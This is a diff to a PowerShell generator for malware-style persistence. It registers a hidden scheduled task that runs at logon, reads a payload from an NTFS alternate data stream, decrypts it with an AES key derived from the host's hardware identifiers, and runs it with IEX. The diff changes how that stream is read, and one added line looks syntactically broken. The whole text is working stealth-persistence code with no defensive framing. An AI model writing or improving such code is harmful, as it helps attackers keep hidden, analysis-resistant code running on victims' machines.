@@ -246,8 +246,8 @@ if ($Persist -eq 'task') {
     if ($Encrypt) {
         # Encrypted task needs decrypt functions
         $minimalScript += @"
-# Scheduled task (encrypted, PS2.0 compatible)
-`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e=[IO.File]::ReadAllText('''+`$hp+':'+`$sn+''');`$p=Dec `$e `$k;IEX `$p'
+# Scheduled task (encrypted)
+`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e=gc ('`$hp`:'+`$sn)|%{`$c+=`$_+[char]10};IEX `$c`"";`$p=Dec `$e `$k;IEX `$p'
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$taskCmd`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
@@ -255,11 +255,10 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
 
 "@
     } else {
-        # Unencrypted task
-$minimalScript += @"
+        # Unencrypted task (FIXED)
+        $minimalScript += @"
 # Scheduled task
-`$adsPath=$hp+':'+$sn
-`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"IEX([IO.File]::ReadAllText(`$hp+':'+`$sn))`""
+`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$c='';gc ('`$hp`:'+`$sn)|%{`$c+=`$_+[char]10};IEX `$c`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
